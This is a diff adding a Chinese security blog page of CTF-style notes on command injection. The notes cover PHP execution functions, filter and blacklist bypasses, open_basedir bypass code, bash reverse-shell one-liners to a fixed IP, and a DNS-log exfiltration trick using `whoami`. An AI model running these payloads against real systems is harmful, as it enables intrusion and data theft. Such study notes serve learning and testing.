@@ -1,0 +1,798 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CoutCin">
+  <meta name="keywords" content="网络安全,内网安全,技术宅">
+  
+    <meta name="description" content="命令执行相关知识点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行-笔记">
+<meta property="og:url" content="https://coutcin-xw.github.io/2022/04/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="CoutCin&#39;s Blog">
+<meta property="og:description" content="命令执行相关知识点">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-23T08:34:53.000Z">
+<meta property="article:modified_time" content="2022-07-17T12:32:18.906Z">
+<meta property="article:author" content="CoutCin">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>命令执行-笔记 - CoutCin&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"coutcin-xw.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"gtag":null,"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CoutCin&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="命令执行-笔记"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-04-23 16:34" pubdate>
+          2022年4月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">命令执行-笔记</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="php常用命令执行函数"><a href="#php常用命令执行函数" class="headerlink" title="php常用命令执行函数"></a>php常用命令执行函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">`反引号<span class="hljs-comment">//执行无回显</span><br><span class="hljs-title function_ invoke__">system</span>() <span class="hljs-comment">//执行外部程序，并且显示输出</span><br><span class="hljs-title function_ invoke__">exec</span>() <span class="hljs-comment">//执行一个外部程序 返回字符串</span><br><span class="hljs-title function_ invoke__">shell_exec</span>() <span class="hljs-comment">//通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</span><br><span class="hljs-title function_ invoke__">passthru</span>() <span class="hljs-comment">//执行外部程序并且显示原始输出</span><br><span class="hljs-title function_ invoke__">pcntl_exec</span>()	<span class="hljs-comment">//在当前进程空间执行指定程序</span><br><span class="hljs-title function_ invoke__">popen</span>()	 <span class="hljs-comment">//打开进程文件指针</span><br><span class="hljs-title function_ invoke__">proc_open</span>() <span class="hljs-comment">//执行一个命令，并且打开用来输入/输出的文件指针</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="执行时过滤空格"><a href="#执行时过滤空格" class="headerlink" title="执行时过滤空格"></a>执行时过滤空格</h2><ul>
+<li>win:<ul>
+<li>%ProgramFiles:~10,1%</li>
+</ul>
+</li>
+<li>linux: <ul>
+<li>$IFS$9</li>
+<li>{cmd,args}(Bash)</li>
+<li>cat&lt;flag.txt</li>
+<li>${IFS}</li>
+<li>;IFS&#x3D;,;</li>
+<li>${str:0:1}  截取</li>
+</ul>
+</li>
+<li>url编码<ul>
+<li>%09,%0b,%0c,%0a,%0d</li>
+</ul>
+</li>
+</ul>
+<h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><ul>
+<li>利用变量拼接：<ul>
+<li>linux:a&#x3D;c;b&#x3D;at;$a​$b flag.php or ${}</li>
+</ul>
+</li>
+<li>利用通配符：* ? </li>
+<li>绕过无数字无字母<ul>
+<li>php7 <ul>
+<li>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。所以很简单了，构造一个可以生成phpinfo这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：  <code>(~%8F%97%8F%96%91%99%90)();</code></li>
+</ul>
+</li>
+<li>shell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替</li>
+<li>我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过.(点)去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在&#x2F;tmp&#x2F;php??????</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>利用已有字符：<ul>
+<li>expr substr $(awk NR&#x3D;1 1.txt) 2 2</li>
+</ul>
+</li>
+</ul>
+<h2 id="截断符号"><a href="#截断符号" class="headerlink" title="截断符号"></a>截断符号</h2><ul>
+<li>$</li>
+<li>;</li>
+<li>|</li>
+<li>-</li>
+<li>(</li>
+<li>)</li>
+<li>反引号</li>
+<li>||</li>
+<li>&amp;&amp;</li>
+<li>&amp;</li>
+<li>}</li>
+<li>{</li>
+<li>%0a 可以当作空格来用；</li>
+</ul>
+<h2 id="利用base编码绕过："><a href="#利用base编码绕过：" class="headerlink" title="利用base编码绕过："></a>利用base编码绕过：</h2><ul>
+<li>`echo ‘Y2F0Cg&#x3D;&#x3D;’ | base64 -d` 1.txt</li>
+</ul>
+<h2 id="利用php伪协议："><a href="#利用php伪协议：" class="headerlink" title="利用php伪协议："></a>利用php伪协议：</h2><ul>
+<li>c&#x3D;$nice&#x3D;include$_GET[“url”]?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.Base64-encode&#x2F;resource&#x3D;flag.php</li>
+</ul>
+<h2 id="打印字符常用命令："><a href="#打印字符常用命令：" class="headerlink" title="打印字符常用命令："></a>打印字符常用命令：</h2><ul>
+<li>cat 由第一行开始显示内容，并将所有内容输出</li>
+<li>tac 从最后一行倒序显示内容，并将所有内容输出</li>
+<li>more 根据窗口大小，一页一页的现实文件内容</li>
+<li>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</li>
+<li>head 只显示头几行</li>
+<li>tail 只显示最后几行</li>
+<li>nl 类似于cat -n，显示时输出行号</li>
+<li>tailf 类似于tail -f  </li>
+<li>sed sed ‘p’ 1.txt</li>
+<li>sort 它将文件进行排序，并将排序结果标准输出</li>
+<li>uniq 用于报告或忽略文件中的重复行</li>
+<li>rev  将文件中的每行内容以字符为单位反序输出</li>
+<li>cut cut -c1- 1.txt</li>
+<li>awk  文本和数据进行处理的编程语言awk ‘{print}’ flag.php</li>
+<li>strings 在对象文件或二进制文件中查找可打印的字符串</li>
+<li>od  输出文件的八进制、十六进制等格式编码的字节 od -c flag.</li>
+<li>paste <strong>paste命令</strong> 用于将多个文件按照列队列进行合并。 可以用来读取文件</li>
+<li>diff  比较给定的两个文件的不同 可以读取数据</li>
+<li>curl file:&#x2F;&#x2F;&#x2F;home&#x2F;xxx.txt 可以读取文件</li>
+<li>bzmore 查看bzip2压缩过的文本文件的内容</li>
+<li>bzless 是增强“.bz2”压缩包查看器，bzless比bzmore命令功能更加强大。</li>
+</ul>
+<h2 id="管道符号："><a href="#管道符号：" class="headerlink" title="管道符号："></a>管道符号：</h2><ul>
+<li>linux:  <ol>
+<li>“ ; “: 执行完前面的语句在执行后面的语句。</li>
+<li>“ | “: 显示后面的语句的执行结果。</li>
+<li>” || “：当前的语句执行出错时，执行后面的语句。</li>
+<li>” &amp; “：两条命令都执行，如果前面语句为假则执行后面的语句，前面的语句    可真可假。</li>
+<li>” &amp;&amp; “：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则执行两条命令，前面的语句只能为真。</li>
+</ol>
+</li>
+<li>win:<ol>
+<li>“ | “ :是直接后面的执行语句</li>
+<li>“ || ” :如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假    才能执行。</li>
+<li>“ &amp; “两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的    语句可真可假。</li>
+<li>“ &amp;&amp; “:如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句    为真则两条命令都执行，前面的语句只能为真。</li>
+</ol>
+</li>
+</ul>
+<h2 id="open-basedir-限制"><a href="#open-basedir-限制" class="headerlink" title="open_basedir 限制"></a>open_basedir 限制</h2><p>&emsp;open_basedir 可将用户访问文件的活动范围限制在指定的区域<br>例如：<br>&emsp;open_basedir&#x3D;&#x2F;tmp&#x2F;:&#x2F;var&#x2F;www&#x2F;html&emsp;代表当前web可访问的文件路径只能为&#x2F;tmp&#x2F;内或者&#x2F;var&#x2F;www&#x2F;html 内的文件可在 php.ini &#x2F; .user.ini 文件配置<br>[?] 使用ini_set方式配置待测试。<br>[?] 是否可以在本地生成一个.user.ini 去替换配置  </p>
+<ul>
+<li>绕过方法：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$dh</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>)) &#123;<br>	<span class="hljs-keyword">while</span> ((<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$dh</span>)) !== <span class="hljs-literal">false</span>) &#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27; &#x27;</span>;<br>	&#125;<br>  <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$dh</span>);<br>&#125;<br><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$f</span>);<br>	<span class="hljs-comment">//@var_dump(@$f-&gt;getSize());</span><br>    <span class="hljs-comment">//printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">try</span> &#123;<span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<br><span class="hljs-string">&#x27;root&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; &#125;<span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;&#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-<br>&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
+
+<h2 id="执行函数禁用"><a href="#执行函数禁用" class="headerlink" title="执行函数禁用"></a>执行函数禁用</h2><h3 id="通过读取文件函数"><a href="#通过读取文件函数" class="headerlink" title="通过读取文件函数"></a>通过读取文件函数</h3><ul>
+<li>file_get_contents()</li>
+<li>highlight_file()</li>
+<li>show_source()</li>
+<li>fgets()</li>
+<li>file()</li>
+<li>readfile()</li>
+</ul>
+<h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><ul>
+<li>反弹shell<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2548">反弹shell基础</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">反弹shell</a></li>
+<li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</li>
+<li>bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;1</li>
+<li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 &lt;&amp;2</li>
+</ul>
+</li>
+<li>curl外带<ul>
+<li>利用dnslog或者httplog外带数据如：<code>ping `whoami`.xxx.com </code>查看日志</li>
+</ul>
+</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" class="category-chain-item">WEB安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
+      
+        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="print-no-link">#命令执行</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>命令执行-笔记</div>
+      <div>https://coutcin-xw.github.io/2022/04/23/命令执行-笔记/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>CoutCin</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/04/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E7%AC%94%E8%AE%B0/" title="文件包含-笔记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">文件包含-笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/04/23/SQL%E6%B3%A8%E5%85%A5-%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/" title="SQL注入-不同数据库下的注入方式">
+                        <span class="hidden-mobile">SQL注入-不同数据库下的注入方式</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
